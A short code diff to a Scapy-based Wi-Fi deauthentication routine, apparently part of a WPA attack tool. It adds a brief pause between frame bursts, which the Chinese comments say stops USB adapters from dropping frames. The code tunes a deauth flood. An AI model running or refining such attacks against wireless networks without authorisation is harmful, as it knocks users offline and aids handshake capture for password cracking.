@@ -183,11 +183,14 @@ class ScapyDeauth(object):
 
         sent = 0
         try:
-            # 爆发阶段：连打 n_rounds 轮（默认 4），中间不停
-            # 静默监听由 AttackWPA 在整次 deauth() 返回后统一 sleep
-            for _ in range(n_rounds):
+            # 爆发阶段：连打 n_rounds 轮（默认 4）
+            # 轮间极短间隔，避免部分 USB 网卡 sendp 堆满丢帧
+            import time as _time
+            for i in range(n_rounds):
                 sendp(burst, iface=iface, inter=gap, verbose=0)
                 sent += burst_size
+                if i + 1 < n_rounds:
+                    _time.sleep(0.02)
         except Exception:
             return sent if sent else 0
         return sent
